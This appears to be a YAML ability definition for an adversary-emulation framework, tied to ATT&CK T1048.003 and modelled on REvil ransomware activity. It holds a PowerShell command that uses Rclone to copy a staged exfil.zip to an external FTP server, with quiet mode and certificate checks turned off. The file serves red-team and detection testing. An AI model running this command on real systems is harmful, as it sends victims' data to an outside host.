- description: 'Rclone may be used by an adversary to exfiltrate data to a publicly
    hosted FTP server.

    [Reference](https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/)'
  id: 3f73be17-6cad-f276-2623-b3117e25335d
  name: Exfiltration Over Alternative Protocol - FTP - Rclone
  platforms:
    windows:
      psh:
        cleanup: ''
        command: $rclone_bin = Get-ChildItem C:\Users\Public\Downloads\ -Recurse -Include
          "rclone.exe" | Select-Object -ExpandProperty FullName; $exfil_pack = Get-ChildItem
          C:\Users\Public\Downloads\ -Recurse -Include "exfil.zip" | Select-Object
          -ExpandProperty FullName; &$rclone_bin config create ftpserver "ftp" "host";
          &$rclone_bin copy --max-age 2y $exfil_pack ftpserver --bwlimit 2M -q --ignore-existing
          --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate
        parsers:
          plugins.atomic.app.parsers.atomic_powershell:
          - source: validate_me
        payloads: []
  tactic: exfiltration
  technique:
    attack_id: T1048.003
    name: 'Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated
      Non-C2 Protocol'
